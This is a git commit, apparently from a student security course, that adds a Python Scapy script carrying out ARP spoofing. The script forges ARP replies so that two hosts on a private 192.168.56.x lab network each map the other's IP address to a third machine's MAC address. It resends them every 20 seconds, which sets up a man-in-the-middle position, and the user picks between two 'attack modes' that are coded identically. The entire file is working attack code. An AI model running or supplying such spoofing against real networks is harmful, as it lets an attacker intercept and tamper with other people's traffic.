8d396c740365c6d83ca669cf07502a1d95bbbbda
yuhsuanlintue <y.lin1@student.tue.nl>
2023-06-01 17:48:06 +0200

    init arp.py

---
+++ ARP.py
@@ -0,0 +1,60 @@
+from scapy.all import *
+import time
+
+
+
+def ARP_spoofing():
+    macM1 = "08:00:27:b7:c4:af"
+    macM2 = "08:00:27:CC:28:6f"
+    macM3 = "08:00:27:d0:25:4b"
+
+    ipM1 = "192.168.56.101"
+    ipM2 = "192.168.56.102"
+    ipM3 = "192.168.56.103"
+
+    arp_M1 = Ether() / ARP()
+    arp_M1[Ether].src = macM3
+    arp_M1[ARP].hwsrc = macM3
+    arp_M1[ARP].psrc = ipM2
+    arp_M1[ARP].hwdst = macM1
+    arp_M1[ARP].pdst = ipM1
+
+    arp_M2 = Ether() / ARP()
+    arp_M2[Ether].src = macM3
+    arp_M2[ARP].hwsrc = macM3
+    arp_M2[ARP].psrc = ipM1
+    arp_M2[ARP].hwdst = macM2
+    arp_M2[ARP].pdst = ipM2
+    sendp(arp_M1, iface = "enp0s3")
+    sendp(arp_M2, iface = "enp0s3")
+
+
+def silent_mode():
+    try:
+        while True:
+            ARP_spoofing()
+            time.sleep(20)
+    except KeyboardInterrupt:
+        pass
+
+def all_out_mode():
+    try:
+        while True:
+            ARP_spoofing()
+            time.sleep(20)
+    except KeyboardInterrupt:
+        pass
+
+if __name__ == "__main__":
+    mode = str(input(   "Plase select the attack mode:\n" +
+                    "type \"1\" for silent mode;\n" +
+                    "type \"2\" for all out mode\n"))
+    if mode == "1":
+        silent_mode()
+    elif mode == "2":
+        all_out_mode()
+    else:
+        print("Input error!")
+
+
+        
